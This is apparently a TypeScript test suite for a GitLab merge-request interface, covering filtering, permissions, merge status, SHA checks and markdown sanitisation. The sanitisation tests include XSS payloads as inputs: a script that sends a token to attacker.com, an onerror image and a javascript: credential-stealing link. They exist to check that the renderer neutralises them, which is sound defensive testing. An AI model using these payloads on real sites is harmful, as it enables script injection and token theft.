import test from 'node:test';
import assert from 'node:assert/strict';

import {
  filterMergeRequests,
  canWrite,
  SCOPE_DISABLED_TOOLTIP,
  evaluateMrMergeStatus,
  validateMergeSha,
} from '../ui/features/mr/mrLogic.ts';

import {
  stripImages,
  renderMrMarkdown,
} from '../ui/features/mr/mrMarkdown.ts';

import {
  DEMO_CURRENT_USER,
  DEMO_REVIEWER_USER,
  DEMO_DEV2_USER,
  DEMO_MERGE_REQUESTS,
} from '../ui/features/mr/fixtures.ts';

// =============================================================================
// Suite 1: MR List Filtering (Open, Mine, Assigned, Review requested, Search)
// =============================================================================

test('mr filter: opened returns only opened MRs', () => {
  const mrs = [
    { ...DEMO_MERGE_REQUESTS[0], state: 'opened' },
    { ...DEMO_MERGE_REQUESTS[1], state: 'merged' },
    { ...DEMO_MERGE_REQUESTS[2], state: 'closed' },
  ];
  const filtered = filterMergeRequests(mrs, 'opened', '', DEMO_CURRENT_USER);
  assert.equal(filtered.length, 1);
  assert.equal(filtered[0].iid, 124);
});

test('mr filter: mine returns MRs authored by current user', () => {
  const filtered = filterMergeRequests(DEMO_MERGE_REQUESTS, 'mine', '', DEMO_CURRENT_USER);
  assert.equal(filtered.length, 1);
  assert.equal(filtered[0].author.id, DEMO_CURRENT_USER.id);
  assert.equal(filtered[0].iid, 124);
});

test('mr filter: assigned returns MRs where current user is in assignees', () => {
  const filtered = filterMergeRequests(DEMO_MERGE_REQUESTS, 'assigned', '', DEMO_CURRENT_USER);
  assert.equal(filtered.length, 2); // MR !124 and MR !126 have currentUser in assignees
  assert.ok(filtered.some((m) => m.iid === 124));
  assert.ok(filtered.some((m) => m.iid === 126));
});

test('mr filter: reviewer returns MRs where current user is in reviewers', () => {
  const filtered = filterMergeRequests(DEMO_MERGE_REQUESTS, 'reviewer', '', DEMO_CURRENT_USER);
  assert.equal(filtered.length, 1); // MR !125 has currentUser as reviewer
  assert.equal(filtered[0].iid, 125);
});

test('mr filter: search query matches title, iid, author name, or branch', () => {
  // By iid
  let res = filterMergeRequests(DEMO_MERGE_REQUESTS, 'opened', '!125', DEMO_CURRENT_USER);
  assert.equal(res.length, 1);
  assert.equal(res[0].iid, 125);

  // By title keyword
  res = filterMergeRequests(DEMO_MERGE_REQUESTS, 'opened', 'biometrik', DEMO_CURRENT_USER);
  assert.equal(res.length, 1);
  assert.equal(res[0].iid, 124);

  // By author username
  res = filterMergeRequests(DEMO_MERGE_REQUESTS, 'opened', 'techlead', DEMO_CURRENT_USER);
  assert.equal(res.length, 1);
  assert.equal(res[0].iid, 126);

  // By source branch
  res = filterMergeRequests(DEMO_MERGE_REQUESTS, 'opened', 'feat/biometric-auth', DEMO_CURRENT_USER);
  assert.equal(res.length, 1);
  assert.equal(res[0].iid, 124);
});

// =============================================================================
// Suite 2: Scope & Write Action Permissions
// =============================================================================

test('scope permissions: only full (api) scope allows write operations', () => {
  assert.equal(canWrite('full'), true);
  assert.equal(canWrite('readOnly'), false);
  assert.equal(canWrite('none'), false);
});

test('scope permissions: disabled tooltip warns about api scope requirement', () => {
  assert.ok(SCOPE_DISABLED_TOOLTIP.includes("scope 'api'"));
  assert.ok(SCOPE_DISABLED_TOOLTIP.includes("Aksi dinonaktifkan"));
});

// =============================================================================
// Suite 3: Merge Status Evaluation & Commit SHA Verification
// =============================================================================

test('merge status: mergeable allows immediate merge', () => {
  const mr = {
    ...DEMO_MERGE_REQUESTS[0],
    state: 'opened',
    detailedMergeStatus: 'mergeable',
    hasConflicts: false,
    draft: false,
  };
  const evalRes = evaluateMrMergeStatus(mr);
  assert.equal(evalRes.mergeable, true);
  assert.equal(evalRes.canMwps, false);
  assert.equal(evalRes.reason, 'Siap di-merge');
});

test('merge status: ci_still_running allows MWPS (merge when pipeline succeeds)', () => {
  const mr = {
    ...DEMO_MERGE_REQUESTS[1],
    state: 'opened',
    detailedMergeStatus: 'ci_still_running',
    hasConflicts: false,
    draft: false,
  };
  const evalRes = evaluateMrMergeStatus(mr);
  assert.equal(evalRes.mergeable, false);
  assert.equal(evalRes.canMwps, true);
  assert.equal(evalRes.reason, 'Pipeline CI/CD sedang berjalan');
});

test('merge status: conflict or cannot_be_merged blocks merge', () => {
  const mr = {
    ...DEMO_MERGE_REQUESTS[2],
    state: 'opened',
    detailedMergeStatus: 'cannot_be_merged',
    hasConflicts: true,
  };
  const evalRes = evaluateMrMergeStatus(mr);
  assert.equal(evalRes.mergeable, false);
  assert.equal(evalRes.canMwps, false);
  assert.ok(evalRes.reason?.includes('konflik'));
});

test('merge status: draft status blocks merge', () => {
  const mr = {
    ...DEMO_MERGE_REQUESTS[0],
    state: 'opened',
    draft: true,
    detailedMergeStatus: 'draft_status',
  };
  const evalRes = evaluateMrMergeStatus(mr);
  assert.equal(evalRes.mergeable, false);
  assert.ok(evalRes.reason?.includes('Draft'));
});

test('sha validation: accepts valid matching head SHA', () => {
  const headSha = 'a1b2c3d4e5f67890abcdef1234567890abcdef12';
  const res = validateMergeSha(headSha, headSha);
  assert.equal(res.valid, true);
  assert.equal(res.error, undefined);
});

test('sha validation: rejects empty or mismatching commit SHA', () => {
  const headSha = 'a1b2c3d4e5f67890abcdef1234567890abcdef12';
  const emptyRes = validateMergeSha('', headSha);
  assert.equal(emptyRes.valid, false);
  assert.ok(emptyRes.error?.includes('tidak boleh kosong'));

  const mismatchRes = validateMergeSha('11223344556677889900aabbccddeeff11223344', headSha);
  assert.equal(mismatchRes.valid, false);
  assert.ok(mismatchRes.error?.includes('tidak cocok'));
});

// =============================================================================
// Suite 4: Markdown Sanitization & XSS Guardrails
// =============================================================================

test('mr markdown: strips external images to prevent token/IP sniffing', () => {
  const markdown = 'Here is the diagram: ![Architecture Diagram](https://external-tracker.com/pixel.png)';
  const stripped = stripImages(markdown);
  assert.ok(!stripped.includes('https://external-tracker.com'));
  assert.ok(stripped.includes('[Gambar: Architecture Diagram]'));

  const html = renderMrMarkdown(markdown);
  assert.ok(!html.includes('<img'));
  assert.ok(!html.includes('external-tracker.com'));
  assert.ok(html.includes('[Gambar: Architecture Diagram]'));
});

test('mr markdown: escapes raw HTML tags and prevents script injection', () => {
  const malicious = '<script>fetch("https://attacker.com/steal?t="+token)</script><img src=x onerror=alert(1)>';
  const html = renderMrMarkdown(malicious);
  assert.ok(!html.includes('<script>'));
  assert.ok(!html.includes('<img'));
  assert.ok(html.includes('&lt;script&gt;'));
  assert.ok(html.includes('&lt;img src=x onerror=alert(1)&gt;'));
});

test('mr markdown: neutralizes javascript: pseudo-protocol in links', () => {
  const maliciousLink = '[Click for update](javascript:window.stealCredentials())';
  const html = renderMrMarkdown(maliciousLink);
  assert.ok(!html.includes('href="javascript:'));
  assert.ok(html.includes('href="#"'));
});

test('mr markdown: cleanly renders code blocks, bold, and safe links', () => {
  const content = `Berikut perbaikannya:
\`\`\`dart
void authenticate() {
  print("ok");
}
\`\`\`
Periksa di [Dokumentasi GitLab](https://gitlab.example.com/docs) atau jalankan \`flutter test\`.`;

  const html = renderMrMarkdown(content);
  assert.ok(html.includes('<pre class="mr-code-block"><code class="language-dart">void authenticate() {'));
  assert.ok(html.includes('<a href="https://gitlab.example.com/docs" target="_blank" rel="noopener noreferrer" class="mr-link">Dokumentasi GitLab</a>'));
  assert.ok(html.includes('<code class="mr-inline-code">flutter test</code>'));
});
